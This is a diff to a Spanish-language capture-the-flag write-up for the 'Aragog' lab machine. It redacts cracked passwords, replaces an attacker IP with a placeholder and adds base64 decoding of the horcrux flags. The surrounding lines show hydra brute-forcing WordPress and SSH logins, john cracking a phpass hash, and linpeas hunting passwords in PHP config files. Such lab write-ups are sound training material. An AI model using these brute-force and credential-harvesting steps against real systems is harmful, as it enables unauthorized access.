@@ -59,6 +59,7 @@ Herramientas utilizadas:
 * *bash*
 * *burpsuite*
 * *hydra*
+* *base64*
 
 
 <br>
@@ -911,7 +912,7 @@ if (!defined('DB_HOST'))
 -rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 /opt/.backup.sh
 
 ╔══════════╣ Searching passwords in config PHP files
-/etc/wordpress/config-default.php:define('DB_PASSWORD', 'mySecr3tPass');                               
+/etc/wordpress/config-default.php:define('DB_PASSWORD', '...');                               
 /etc/wordpress/config-default.php:define('DB_USER', 'root');
 /usr/share/wordpress/wp-admin/setup-config.php: $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
 /usr/share/wordpress/wp-admin/setup-config.php: define('DB_PASSWORD', $pwd);
@@ -1002,7 +1003,7 @@ Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
 Cost 1 (iteration count) is 8192 for all loaded hashes
 Will run 5 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-password123      (?)     
+....      (?)     
 1g 0:00:00:00 DONE (2024-11-06 15:25) 11.11g/s 16000p/s 16000c/s 16000C/s camilo..michel
 Use the "--show --format=phpass" options to display all of the cracked passwords reliably
 Session completed.
@@ -1029,9 +1030,9 @@ Una vez que lo descargues, lo pasamos a la máquina víctima.
 
 Activa un servidor en **Python** y con **wget** lo descargamos:
 ```bash
-hagrid98@Aragog:~$ wget http://192.168.100.203/pspy64
---2024-11-07 03:10:04--  http://192.168.100.203/pspy64
-Connecting to 192.168.100.203:80... connected.
+hagrid98@Aragog:~$ wget http://Tu_IP/pspy64
+--2024-11-07 03:10:04--  http://Tu_IP/pspy64
+Connecting to Tu_IP:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 3104768 (3.0M) [application/octet-stream]
 Saving to: ‘pspy64’
@@ -1157,6 +1158,18 @@ Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWV
 ```
 Con esto, completamos la máquina.
 
+Veamos qué dicen los horocruxes:
+```bash
+# Horocrux 1:
+echo -n "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d
+1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets                                                                                                                                                                                                                 
+
+# Horocrux 2:
+echo -n "MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=" | base64 -d
+2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
+```
+Completado.
+
 <h2 id="FuerzaBruta">Aplicando Fuerza Bruta a Login de WordPress y a Servicio SSH</h2>
 
 En el caso de que hayamos encontrado un usuario que existe en **WordPress** o en el **servicio SSH**, podemos aplicarle fuerza bruta con la herramienta **hydra**.
@@ -1181,11 +1194,11 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 15:59:34
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking http-post-form://192.168.1.005:80/blog/wp-login.php:log=hagrid98&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.005%2Fblog%2Fwp-admin%2F&testcookie=1:S=302
-[80][http-post-form] host: 192.168.1.005   login: hagrid98   password: password123
+[80][http-post-form] host: 192.168.1.005   login: hagrid98   password: ....
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-06 16:00:04
 ```
-Excelente, obtuvo la contraseña de hagrid98.
+Excelente, obtuvo la contraseña de **hagrid98**.
 
 De igual forma, podemos aplicar al **servicio SSH**; solamente le indicamos al final el tipo de servicio al que va el ataque:
 ```bash
@@ -1198,14 +1211,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 16:02:
 [DATA] attacking ssh://192.168.1.005:22/
 [STATUS] 238.00 tries/min, 238 tries in 00:01h, 14344163 to do in 1004:30h, 14 active
 [STATUS] 222.67 tries/min, 668 tries in 00:03h, 14343733 to do in 1073:38h, 14 active
-[22][ssh] host: 192.168.1.005   login: hagrid98   password: password123
+[22][ssh] host: 192.168.1.005   login: hagrid98   password: ....
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 3 final worker threads did not complete until end.
 [ERROR] 3 targets did not resolve or could not be connected
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-06 16:09:05
 ```
-Una vez más, obtuvo la contraseña del usuario hagrid98.
+Una vez más, obtuvo la contraseña del **usuario hagrid98**.
 
 
 <br>
